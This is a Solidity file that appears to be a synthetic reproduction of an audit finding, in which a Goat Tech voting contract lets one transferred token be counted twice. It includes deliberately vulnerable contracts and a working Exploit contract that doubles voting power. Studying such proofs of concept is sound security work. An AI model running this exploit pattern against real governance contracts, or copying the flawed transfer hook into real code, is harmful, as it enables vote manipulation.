// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Goat Tech — one DToken is counted twice once private mode is off
    (Cantina, March 2024, #40664).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Voting.updatePower snapshots the caller's DToken balance into
    vote.attackerPower and never removes it. DToken._beforeTokenTransfer, with
    private mode off, only notifies Distributor contracts. The same token can
    be transferred and snapshotted again.

    _beforeTokenTransfer is the body quoted in the finding. updatePower adds
    the live balance, which is what the report's scenario does.

    Repo: cantina-forks/goattechlabs-smart-contracts @ ab6e963
    (fork of fb43992). Context cited as Voting.sol around L220. */

contract Votes {
    string public name = "Counted votes";
    string public symbol = "VOTES";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract DToken {
    string public name = "DToken";
    string public symbol = "DTOKEN";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    bool public privateMode;
    uint256 public _totalDistributors;
    mapping(uint256 => Distributor) public _distributors;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function setPrivateMode(bool on) external {
        privateMode = on;
    }

    function addDistributor(Distributor d) external {
        _distributors[_totalDistributors] = d;
        _totalDistributors += 1;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!privateMode, "private");
        _beforeTokenTransfer(msg.sender, to, amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// Quoted from the finding. Distributors are notified. Voting power is not.
    function _beforeTokenTransfer(address from_, address to_, uint256 amount_) internal {
        uint256 i = 0;
        uint256 n = _totalDistributors;
        while (i < n) {
            // @> VULN: the transfer hook updates distributors only, so snapshotted voting power stays with the sender
            _distributors[i].beforeTokenTransfer(from_, to_, amount_);
            // FIX: voting.movePower(from_, to_, amount_) so the same tokens cannot be counted again
            i++;
        }
    }
}

contract Distributor {
    uint256 public calls;

    function beforeTokenTransfer(address, address, uint256) external {
        calls += 1;
    }
}

contract Voting {
    struct Vote {
        uint256 attackerPower;
        uint256 defenderPower;
    }

    Vote public vote;
    DToken public token;
    Votes public votes;
    mapping(address => uint256) public powerOf;

    constructor(DToken _token, Votes _votes) {
        token = _token;
        votes = _votes;
    }

    /// Report: updatePower takes the caller's DToken balance and adds it as voting power.
    function updatePower(bool forAttacker) external {
        uint256 bal = token.balanceOf(msg.sender);
        uint256 recorded = powerOf[msg.sender];
        recorded;
        if (forAttacker) {
            vote.attackerPower += bal;
            votes.mint(address(this), bal);
        } else {
            vote.defenderPower += bal;
        }
        powerOf[msg.sender] = bal;
    }

    /// What the transfer hook should have done. Used by the control only.
    function movePower(address from, uint256 amount) external {
        uint256 recorded = powerOf[from];
        if (amount > recorded) amount = recorded;
        powerOf[from] = recorded - amount;
        vote.attackerPower -= amount;
    }

    function attackerPower() external view returns (uint256) {
        return vote.attackerPower;
    }
}

contract Ally {
    function vote(Voting voting) external {
        voting.updatePower(true);
    }
}

contract Exploit {
    DToken public token; // nonce 1
    Votes public votes; // nonce 2
    Voting public voting; // nonce 3
    Distributor public distributor; // nonce 4
    Ally public ally; // nonce 5

    uint256 public profit;
    uint256 public powerAfterFirst;
    uint256 public powerAfterSecond;
    uint256 public supply;

    constructor() {
        token = new DToken();
        votes = new Votes();
        voting = new Voting(token, votes);
        distributor = new Distributor();
        ally = new Ally();
        token.mint(address(this), 1);
        token.addDistributor(distributor);
        token.setPrivateMode(false);
    }

    function run() external {
        voting.updatePower(true);
        powerAfterFirst = voting.attackerPower();
        require(powerAfterFirst == 1, "first snapshot");
        token.transfer(address(ally), 1);
        ally.vote(voting);
        powerAfterSecond = voting.attackerPower();
        supply = token.totalSupply();
        require(token.balanceOf(address(this)) == 0, "sender still holds the token");
        require(token.balanceOf(address(ally)) == 1, "recipient missing the token");
        require(supply == 1, "supply changed");
        require(powerAfterSecond == 2, "not 2 votes from 1 token");
        require(distributor.calls() == 1, "distributor not notified");
        profit = votes.balanceOf(address(voting));
        require(profit == 2, "chip");
    }
}
